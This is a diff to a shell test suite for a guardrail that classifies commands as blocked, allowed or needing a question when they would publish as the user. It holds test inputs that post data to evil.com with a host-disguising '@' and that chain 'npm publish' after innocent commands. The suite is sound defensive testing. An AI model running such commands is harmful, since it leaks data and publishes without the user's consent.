@@ -9,11 +9,17 @@ blocks() {
     echo "  FAIL [$2]: expected BLOCK, got allow — '$1'"; FAILS=1
   fi
 }
-# allows <cmdline> <label> — expects the command to pass through
+# allows <cmdline> <label> — expects the command to pass through, neither blocked nor asked about
 allows() {
-  if _guardrails_publishes_as_user "$1" >/dev/null; then
-    echo "  FAIL [$2]: expected ALLOW, got block — '$1'"; FAILS=1
-  fi
+  _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 1 ] || { echo "  FAIL [$2]: expected ALLOW, got rc $rc — '$1'"; FAILS=1; }
+}
+# asks <cmdline> <label> — expects a question, rc 2: a verb read from one piece of a quoted argument
+asks() {
+  _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 2 ] || { echo "  FAIL [$2]: expected ASK, got rc $rc — '$1'"; FAILS=1; }
 }
 
 # ---------------------------------------------------------------------------
@@ -517,5 +523,27 @@ allows 'curl -d x "http://localhost":8080/x'       "a quote that closes before t
 allows 'curl -d x "http://127.0.0.1":8080/x'       "a quote that closes a loopback address before the port"
 blocks 'curl -d x "http://localhost":3000@evil.com' "a user before an @ is not the host"
 blocks 'curl -d x "http://127.0.0.1":3000@evil.com' "a loopback user before an @ is not the host"
+
+# A verb read from one piece of a quoted argument of several words asks, as the shell passes the argument whole. One
+# read from a whole quoted word blocks, as does one in the middle of a quoted argument, as before (#131).
+asks   'claude "review this"'                       "a verb from the first piece of a quoted argument"
+asks   'python3 x.py "post this"'                   "a verb from the first piece, after a script"
+asks   "ssh host 'npm publish'"                     "a verb from the last piece of a quoted argument"
+asks   'gh "pr create" --fill'                      "a ready PR read from pieces of a quoted argument"
+asks   'x comment\ it'                              "a verb from a word an escaped blank joins to the next"
+asks   "bash -c 'claude \"review this\"'"           "a verb from a piece of a quoted argument in a payload"
+blocks 'python3 x.py "a post here"'                 "a verb in the middle of a quoted argument, as before"
+blocks 'x "post this" comment'                      "a whole verb after the pieces of a quoted argument"
+blocks 'gh pr co"mm"ent 1 -b x'                     "a word quoted in its middle is whole"
+blocks "gh pr 'comment' 1 -b x"                     "a single-quoted verb is whole"
+blocks 'claude "review this" && gh pr comment 1 -b x' "a question about one command hides no publish after it"
+blocks "bash -c 'claude \"review this\"'; npm publish" "a question inside a payload hides no publish after it"
+allows 'git commit -m "post the review"'            "a commit message naming verbs"
+per_line_asks() {
+  _GUARDRAILS_SPLIT_PER_LINE=1 _guardrails_publishes_as_user "$1" >/dev/null
+  local rc=$?
+  [ "$rc" = 2 ] || { echo "  FAIL [$2]: expected ASK, got rc $rc"; FAILS=1; }
+}
+per_line_asks $'git commit -m "Fix it\nsee the review"' "the per-line split cuts a quoted line into pieces too"
 
 finish "publish-cmd"
